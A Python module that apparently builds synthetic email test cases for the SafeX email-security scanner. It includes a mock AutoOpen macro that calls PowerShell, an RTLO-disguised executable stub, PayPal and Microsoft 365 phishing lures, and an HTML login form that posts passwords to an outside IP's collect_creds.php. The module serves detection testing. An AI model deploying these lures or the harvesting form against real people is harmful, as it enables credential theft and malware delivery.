"""
SafeX Test Samples Suite
Generates realistic, harmless, synthetic test samples satisfying all verification criteria:
1. Legitimate urgent message with long tracking URLs (False-Positive Reduction)
2. Renamed executable (.pdf containing MZ header)
3. Macro-enabled Office document (vbaProject.bin with AutoOpen)
4. Phishing email with link mismatch & brand display-name spoofing
5. Password-protected ZIP archive with password in body
6. Legitimate vendor PDF invoice (clean static structure)
7. Genuine plain DOCX & benign image archive
8. Unicode Right-to-Left Override (RTLO) extension deception
9. HTML credential-harvesting & smuggling attachment
"""

import io
import zipfile
from typing import Dict, Any, List, Tuple


def create_safe_mz_executable() -> bytes:
    """Creates a harmless dummy binary with Windows PE 'MZ' magic bytes."""
    header = b"MZ" + b"\x90" * 58 + b"\x80\x00\x00\x00"  # standard stub
    padding = b"This is a harmless SafeX test payload simulating an MZ executable header.\x00"
    return header + padding + (b"\x00" * 200)


def create_clean_pdf() -> bytes:
    """Creates a harmless, completely clean static PDF document."""
    pdf_content = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n"
        b"4 0 obj\n<< /Length 55 >>\nstream\n"
        b"BT /F1 24 Tf 100 700 Td (INVOICE #94821 - ACME CORP) Tj ET\n"
        b"endstream\nendobj\n"
        b"xref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000056 00000 n \n"
        b"0000000111 00000 n \n0000000212 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\n"
        b"startxref\n318\n%%EOF"
    )
    return pdf_content


def create_malicious_active_pdf() -> bytes:
    """Creates a harmless static PDF with active code markers (/OpenAction, /JavaScript, /Launch)."""
    pdf_content = (
        b"%PDF-1.7\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\nendobj\n"
        b"4 0 obj\n<< /Length 20 >>\nstream\n(Suspicious PDF) Tj\nendstream\nendobj\n"
        b"5 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert('SafeX Static Test');) >>\nendobj\n"
        b"xref\n0 6\n0000000000 65535 f \n"
        b"trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n250\n%%EOF"
    )
    return pdf_content


def create_clean_docx() -> bytes:
    """Creates a harmless, clean OpenXML .docx without any macros or external relations."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>')
        zf.writestr("_rels/.rels", '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>')
        zf.writestr("word/document.xml", '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Quarterly Business Review Report - Confirmed Legitimate</w:t></w:r></w:p></w:body></w:document>')
    return buf.getvalue()


def create_macro_docx() -> bytes:
    """Creates an OpenXML document (.docx or .docm) containing vbaProject.bin with AutoOpen triggers."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
        # Mock vbaProject binary stream containing suspicious auto-exec keywords
        vba_payload = b"OLE_STREAM_VBA_PROJECT_MOCK\x00Sub AutoOpen()\x00Call Shell(\"powershell.exe -enc ...\")\x00End Sub\x00Document_Open"
        zf.writestr("word/vbaProject.bin", vba_payload)
        zf.writestr("word/document.xml", '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Please enable macros to view protected content.</w:t></w:r></w:p></w:body></w:document>')
    return buf.getvalue()


def create_encrypted_zip(password: str = "SafePass2026") -> bytes:
    """Creates a password-protected zip file in-memory using zipfile."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.setpassword(password.encode("utf-8"))
        # Add an encrypted entry
        zf.writestr("confidential_payroll_data.csv", b"EmployeeID,Salary,Bonus\nE101,$120000,$15000\n", compress_type=zipfile.ZIP_DEFLATED)
    
    # Ensure encryption flag bit 0 is set on the zip entry
    raw_data = bytearray(buf.getvalue())
    # In standard PKZIP local header, byte 6 is flag byte bit 0
    if len(raw_data) > 10 and raw_data[0:4] == b"PK\x03\x04":
        raw_data[6] |= 0x01  # Set bit 0 (encrypted)
    # Also set central directory flag bit
    cd_offset = raw_data.find(b"PK\x01\x02")
    if cd_offset != -1 and len(raw_data) > cd_offset + 10:
        raw_data[cd_offset + 8] |= 0x01

    return bytes(raw_data)


def create_benign_image_zip() -> bytes:
    """Creates a harmless ZIP containing images."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        # Dummy 1x1 PNG
        png_data = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
        zf.writestr("product_photo_1.png", png_data)
        zf.writestr("specs_notes.txt", b"Product specification notes for client approval.")
    return buf.getvalue()


def create_archive_with_hidden_executable() -> bytes:
    """Creates a harmless ZIP archive containing an executable (.exe) inside."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("Update_Patch_v2.1.exe", create_safe_mz_executable())
        zf.writestr("readme.txt", b"Please run Update_Patch_v2.1.exe to apply urgent security patch.")
    return buf.getvalue()


def create_html_phishing_attachment() -> bytes:
    """Creates an HTML file attachment containing a password harvesting form and smuggling script."""
    html_code = (
        '<!DOCTYPE html>\n<html>\n<head><title>Office 365 Verification Portal</title></head>\n'
        '<body>\n'
        '  <h2>Your session has expired. Please sign in to verify your identity.</h2>\n'
        '  <form action="http://185.220.101.4/collect_creds.php" method="POST">\n'
        '    <label>Email Address:</label><input type="email" name="user" value="victim@targetcorp.com"><br>\n'
        '    <label>Password:</label><input type="password" name="pass" required><br>\n'
        '    <button type="submit">Verify Now</button>\n'
        '  </form>\n'
        '  <script>\n'
        '    var smuggled = window.atob("VGhpcyBpcyBhIGZha2UgcGF5bG9hZA==");\n'
        '    console.log("Smuggled data length: " + smuggled.length);\n'
        '  </script>\n'
        '</body>\n</html>'
    )
    return html_code.encode("utf-8")


def get_test_samples() -> Dict[str, Dict[str, Any]]:
    """
    Returns pre-configured test scenarios for the user and automated testing.
    """
    samples = {
        "scenario_1_legitimate_urgent": {
            "id": 1,
            "title": "Legitimate Urgent Notice (False-Positive Prevention)",
            "description": "Benign corporate security training deadline with urgency words and a long tracking URL. Demonstrates that authentic SPF/DKIM/DMARC headers prevent false alerts.",
            "expected_verdict": "LOW",
            "email_text": (
                "From: Acme Security Team <security-training@acme-corp.com>\n"
                "To: employee@acme-corp.com\n"
                "Subject: ACTION REQUIRED: Mandatory Compliance Training Deadline in 24 Hours\n"
                "Date: Fri, 16 Oct 2026 09:00:00 +0000\n"
                "Authentication-Results: spf=pass smtp.mailfrom=acme-corp.com; dkim=pass header.d=acme-corp.com; dmarc=pass\n"
                "Message-ID: <compliance-2026-1016@acme-corp.com>\n\n"
                "Dear Colleague,\n\n"
                "This is a final notice that your annual cybersecurity awareness training is overdue. "
                "Immediate action required before the portal closes within 24 hours to maintain active intranet access.\n\n"
                "Please access your assigned module here:\n"
                "https://lms.acme-corp.com/learn/track?session=98471298417294812&utm_source=internal_mailer&utm_campaign=annual_compliance_q4&lang=en-US\n\n"
                "If you have already completed the course, please disregard this automated notification.\n\n"
                "Regards,\n"
                "Information Security Office\n"
                "Acme Corporation\n"
            ),
            "attachments": []
        },

        "scenario_2_disguised_executable": {
            "id": 2,
            "title": "Disguised Executable (.pdf with MZ header)",
            "description": "A Windows executable renamed to invoice_march_2026.pdf. SafeX detects the underlying MZ byte signature without executing the file.",
            "expected_verdict": "HIGH / CRITICAL",
            "email_text": (
                "From: Accounts Payable <billing@supplier-hub.net>\n"
                "To: accounting@company.com\n"
                "Subject: Outstanding Overdue Invoice #INV-88912\n"
                "Date: Fri, 16 Oct 2026 11:15:00 +0000\n"
                "Authentication-Results: spf=softfail; dkim=none\n\n"
                "Please find attached our updated overdue invoice. Prompt remittance advice required.\n"
                "Review the invoice attached to reconcile the balance immediately.\n"
            ),
            "attachments": [
                ("invoice_march_2026.pdf", create_safe_mz_executable(), "application/pdf")
            ]
        },

        "scenario_3_macro_document": {
            "id": 3,
            "title": "Weaponized Office Document (Macro-Enabled)",
            "description": "Office document containing an embedded VBA project with AutoOpen execution triggers disguised inside a plain extension.",
            "expected_verdict": "HIGH / CRITICAL",
            "email_text": (
                "From: Human Resources <hr-review@internal-staffing.org>\n"
                "To: staff@company.com\n"
                "Subject: Annual Compensation Review & Bonus Allocation\n"
                "Date: Fri, 16 Oct 2026 12:30:00 +0000\n\n"
                "Please review your bonus allocation summary in the attached document.\n"
                "If prompted, click 'Enable Content' to load the dynamic compensation macro calculation tables.\n"
            ),
            "attachments": [
                ("Compensation_Review_2026.docx", create_macro_docx(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
            ]
        },

        "scenario_4_link_mismatch_phishing": {
            "id": 4,
            "title": "Brand Phishing with Link Mismatch & Spoofing",
            "description": "Display name impersonates PayPal Support while technical address is from an unauthorized domain, with link anchor text showing paypal.com but pointing to a deceptive domain.",
            "expected_verdict": "CRITICAL",
            "email_text": (
                'From: "PayPal Account Security" <alert-no-reply@mailer-relay99.xyz>\n'
                'Reply-To: security-tickets@attacker-collector.top\n'
                'To: victim@gmail.com\n'
                'Subject: Critical Alert: Your PayPal Account Has Been Suspended\n'
                'Authentication-Results: spf=fail; dkim=fail; dmarc=fail\n\n'
                '<html><body>\n'
                '<p>Dear Customer,</p>\n'
                '<p>We detected unauthorized access to your wallet from an unfamiliar IP address. Immediate verification required within 24 hours.</p>\n'
                '<p><a href="http://paypal.com.account-verify-portal.xyz/login">https://www.paypal.com/signin</a></p>\n'
                '<p>Failure to verify will lead to permanent account suspension.</p>\n'
                '</body></html>'
            ),
            "attachments": []
        },

        "scenario_5_password_protected_zip": {
            "id": 5,
            "title": "Password-Protected ZIP with Password in Body",
            "description": "The sender provides an archive password in the email body to bypass gateway scanners, accompanied by an encrypted ZIP attachment.",
            "expected_verdict": "HIGH",
            "email_text": (
                "From: External Vendor <contracts@partner-secure.co>\n"
                "To: legal@targetcompany.com\n"
                "Subject: Executed Vendor Contract Agreement (Encrypted File)\n"
                "Date: Fri, 16 Oct 2026 14:00:00 +0000\n"
                "Authentication-Results: spf=none\n\n"
                "Hello Team,\n\n"
                "Due to privacy compliance, the executed contract is attached inside a secured ZIP archive.\n"
                "The archive password is: SafePass2026\n\n"
                "Please extract and sign the agreement promptly.\n"
            ),
            "attachments": [
                ("Executed_Agreement.zip", create_encrypted_zip("SafePass2026"), "application/zip")
            ]
        },

        "scenario_6_clean_vendor_invoice": {
            "id": 6,
            "title": "Legitimate Vendor PDF Invoice (Clean Structure)",
            "description": "A completely legitimate PDF invoice with no active JavaScript, OpenActions, or executable launches, sent with valid headers.",
            "expected_verdict": "LOW",
            "email_text": (
                "From: Billing Services <invoices@cloudprovider.com>\n"
                "To: accounts@enterprise.com\n"
                "Subject: Monthly Cloud Services Invoice #94821\n"
                "Date: Fri, 16 Oct 2026 15:00:00 +0000\n"
                "Authentication-Results: spf=pass smtp.mailfrom=cloudprovider.com; dkim=pass; dmarc=pass\n\n"
                "Hello,\n\n"
                "Your monthly cloud services invoice for September is now available. Attached is the static PDF statement.\n"
                "Thank you for your business.\n\n"
                "CloudProvider Billing Team\n"
            ),
            "attachments": [
                ("CloudProvider_Invoice_94821.pdf", create_clean_pdf(), "application/pdf")
            ]
        },

        "scenario_7_clean_docx_and_images": {
            "id": 7,
            "title": "Benign Plain DOCX & Image Archive",
            "description": "Genuine business collaboration email containing a standard macro-free DOCX document and a clean ZIP file containing only photos.",
            "expected_verdict": "LOW",
            "email_text": (
                "From: Marketing Coordinator <sarah.jenkins@designcorp.com>\n"
                "To: team@designcorp.com\n"
                "Subject: Product Launch Assets & Final Brief\n"
                "Date: Fri, 16 Oct 2026 15:30:00 +0000\n"
                "Authentication-Results: spf=pass; dkim=pass; dmarc=pass\n\n"
                "Hi Everyone,\n\n"
                "Attached is our finalized product launch brief in DOCX format along with high-res product photos inside a ZIP file.\n"
                "Let me know if you need any adjustments.\n\n"
                "Best regards,\nSarah\n"
            ),
            "attachments": [
                ("Launch_Brief_Final.docx", create_clean_docx(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
                ("Product_Photos.zip", create_benign_image_zip(), "application/zip")
            ]
        },

        "scenario_8_rtlo_filename_attack": {
            "id": 8,
            "title": "Unicode Right-to-Left Override (RTLO) Attack",
            "description": "Malicious payload using the Unicode RTLO character (U+202E) to make an executable (.exe) appear to Windows users as a plain text or PDF file.",
            "expected_verdict": "CRITICAL",
            "email_text": (
                "From: Executive Assistant <board-updates@directors-portal.net>\n"
                "To: executives@company.com\n"
                "Subject: Confidential Board Meeting Minutes\n"
                "Date: Fri, 16 Oct 2026 16:15:00 +0000\n\n"
                "Attached are the confidential meeting minutes from yesterday's executive session.\n"
            ),
            "attachments": [
                ("Board_Minutes_\u202etxt.exe", create_safe_mz_executable(), "application/octet-stream")
            ]
        },

        "scenario_9_html_credential_smuggling": {
            "id": 9,
            "title": "HTML Smuggling & Offline Credential Phishing Attachment",
            "description": "Attached HTML file containing a password input field, login form pointing to an untrusted IP address, and Base64 client-side assembly (HTML smuggling).",
            "expected_verdict": "CRITICAL",
            "email_text": (
                "From: Microsoft 365 Security <no-reply@notification-center365.com>\n"
                "To: user@enterprise.com\n"
                "Subject: Important: Your Microsoft 365 Account Password Has Expired\n"
                "Date: Fri, 16 Oct 2026 16:45:00 +0000\n"
                "Authentication-Results: spf=softfail; dkim=none\n\n"
                "Your password has expired. Open the attached verification portal to restore mailbox synchronization.\n"
            ),
            "attachments": [
                ("Session_Verification.html", create_html_phishing_attachment(), "text/html")
            ]
        }
    }
    return samples
